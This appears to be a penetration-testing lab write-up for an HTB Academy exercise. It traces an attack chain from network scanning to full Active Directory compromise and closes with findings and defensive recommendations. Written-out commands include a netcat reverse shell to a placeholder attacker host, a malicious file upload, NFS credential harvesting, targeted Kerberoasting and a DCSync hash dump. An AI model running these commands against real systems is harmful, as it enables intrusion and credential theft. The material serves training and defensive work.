# 🛰️ Initial Reconnaissance

## 🔍 External Network Scanning

### 📊 Target Identification
```cmd
# Scan target IP ranges for open ports and services
nmap -sn 172.16.8.0/24
```

### 💡 Web Application Discovery
```bash
# Identify web applications on the target network
proxychains gobuster -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -t 50 -u http://172.16.8.3/
```

## ⚙️ Foothold Establishment

### 🔗 Command Injection & Reverse Shell
```bash
# Exploit command injection vulnerability to establish a reverse shell
nc -e /bin/bash <attacker_ip> <local_port>
```

### 🛠️ Privilege Escalation on Initial Host

#### 💥 File Upload Bypass
```bash
# Use an upload bypass technique to place a malicious payload
curl -T /path/to/malicious_payload http://<target_ip>/upload/
```

#### 🔒 Pivoting to Internal Network
```bash
# Set up SSH tunneling for pivoting
ssh -L 80:172.16.8.5:80 user@initial_host
```

### 📈 Service Discovery & Enumeration

#### 💥 NFS Exploitation
```bash
# Mount a shared NFS directory to access sensitive files
mount -t nfs <nfs_server_ip>:/shared /mnt/nfs
```

#### 🔑 Credential Harvesting via Sensitive Files
```bash
# Access and extract credentials from sensitive files on the NFS share
cat /mnt/nfs/important_files.txt
```

## 🚀 Lateral Movement

### 💥 Print Spoofer & SYSTEM Privileges
```bash
# Exploit PrintSpoofer to gain SYSTEM privileges
proxychains printspoofer -i <target_ip> --system
```

### 🔎 Active Directory Enumeration
```bash
# Enumerate the Active Directory environment using BloodHound
SharpHound Invoke-BloodHound -CollectionMethod All
```

## ⚔️ Domain Controller Compromise

### 💣 Kerberoasting & DCSync
#### 🧑‍💻 GenericWrite Abuse
```powershell
# Add a fake SPN to the target user's account
Set-DomainObject -Identity ttimmons -Add @{serviceprincipalname="/ldap/web02$"}
```

#### 🔓 Extracting TGS Tickets
```bash
# Use GetUserSPNs.py to extract TGS tickets for the targeted service
GetUserSPNs.py -request -dc-ip 172.16.8.3 ttimmons
```

### 🔐 DCSync Attack Execution

#### 💎 NTDS Database Extraction
```bash
# Execute the secretsdump command to dump NTDS database credentials
proxychains secretsdump.py Administrator@172.16.8.3 -just-dc-ntlm
```

## 📊 Complete Domain Control Validation

### 🔒 Cleanup and Documentation

#### 💬 Removing Fake SPN
```powershell
# Remove the fake SPN from the target user's account
Set-DomainObject -Identity ttimmons -Clear serviceprincipalname
```

#### 💬 Removing Membership from Server Admins Group
```powershell
# Remove the compromised user from sensitive groups to maintain operational security
Remove-DomainGroupMember -Identity "Server Admins" -Members 'ttimmons'
```

## 🏆 Complete Attack Chain Summary

### 🚀 External → Domain Admin Path
```cmd
# Phase 1: External Reconnaissance
Nmap scans → DNS zone transfer → Subdomain discovery → 0 Web applications

# Phase 2: Initial Foothold  
Web application testing → Command injection → Reverse shell → TTY upgrade

# Phase 3: Persistence & Privilege Escalation
Audit log mining → SSH access → GTFOBins → Root access

# Phase 4: Internal Reconnaissance
SSH pivoting → Host discovery → NFS exploitation → Credential harvesting

# Phase 5: Lateral Movement
PrintSpoofer → SYSTEM → Multiple host compromise

# Phase 6: Active Directory Compromise
BloodHound analysis → GenericWrite abuse → Targeted Kerberoasting → DCSync → Domain Admin
```

### 📋 Comprehensive Findings Summary
```cmd
# Critical/High Risk Findings:
1. Unrestricted File Upload → RCE
2. Command Injection → System compromise
3. Insecure File Shares → Credential exposure
4. Weak Active Directory Passwords → Domain compromise
5. Excessive AD Group Privileges → Lateral movement
6. GenericWrite ACL Misconfiguration → Privilege escalation
7. DCSync Privileges → Complete domain access

# Medium Risk Findings:
8. HTTP Verb Tampering → Information disclosure
9. IDOR Vulnerabilities → Data exposure
10. Directory Listing Enabled → Information leakage
11. Kerberoasting Vulnerabilities → Credential attacks

# Informational Findings:
12. Abandoned Test Applications → Attack surface
13. Legacy Credentials in Scripts → Historical exposure
14. Passwords in AD Descriptions → Information disclosure
```

## 🛠️ Tools & Techniques Mastery

### 🔍 Reconnaissance Tools
```bash
# External enumeration:
Nmap, DNS zone transfers, EyeWitness, Gobuster, WPScan

# Internal enumeration:  
BloodHound, SharpHound, PowerView, Snaffler, CrackMapExec

# Credential hunting:
Secretsdump, Mimikatz, LaZagne, Registry analysis
```

### ⚔️ Exploitation Techniques
```bash
# Web application attacks:
SQL injection, XSS, XXE, SSRF, File upload bypasses

# Privilege escalation:
PrintSpoofer, GTFOBins, Sysax Automation, Unattend.xml

# Active Directory attacks:
Kerberoasting, Password spraying, DCSync, ACL abuse
```

## 🎯 HTB Academy Labs

### 📋 Final Lab Solutions
```cmd
# Lab 1: Targeted Kerberoasting
1. BloodHound analysis → GenericWrite identification
2. PSCredential creation → mssqladm authentication  
3. Fake SPN assignment → acmetesting/LEGIT
4. TGS ticket extraction → GetUserSPNs.py
5. Password cracking → Hashcat success
6. Password discovery → ttimmons:[PASSWORD]

# Lab 2: Domain Controller Access
1. Group membership addition → ttimmons to Server Admins
2. DCSync privilege inheritance → GetChanges/GetChangesAll
3. NTDS database dump → secretsdump.py execution
4. Domain Admin hash → Administrator NT hash
5. DC authentication → Pass-the-Hash WinRM
6. Flag retrieval → Administrator Desktop access

# Lab 3: NTDS Hash Extraction
1. DCSync attack execution → Complete credential dump
2. Administrator hash extraction → Domain Admin access
3. Evidence collection → NTDS database analysis
```

### 🔍 Professional Methodology Demonstrated
```cmd
# Systematic approach:
- Complete external enumeration before internal pivot
- Establish multiple persistence mechanisms
- Document all attack paths and evidence
- Maintain operational security during testing

# Advanced techniques:
- Multi-stage privilege escalation chains
- Complex pivoting and tunneling setups
- Active Directory attack path exploitation
- Professional cleanup and documentation

# Real-world application:
- Enterprise network penetration methodology
- Complete attack chain from external to Domain Admin
- Evidence collection for professional reporting
- Client communication and impact demonstration
```

## 🛡️ Comprehensive Defensive Recommendations

### 🔒 Active Directory Hardening
```cmd
# Privilege management:
- Implement least privilege principles
- Regular ACL audits and cleanup
- Monitor privileged group memberships
- Implement Privileged Access Management (PAM)

# Authentication security:
- Deploy strong password policies
- Implement multi-factor authentication
- Monitor for Kerberoasting attacks
- Regular credential rotation

# Monitoring and detection:
- Deploy advanced threat detection
- Monitor DCSync attack attempts
- Implement honeypot accounts
- Regular security assessments
```

### 🌐 Network Security
```cmd
# Segmentation:
- Implement proper network segmentation
- Deploy zero-trust architecture
- Restrict lateral movement capabilities
- Monitor east-west traffic

# Application security:
- Regular web application security testing
- Implement secure development practices
- Deploy Web Application Firewalls
- Regular vulnerability assessments
```

---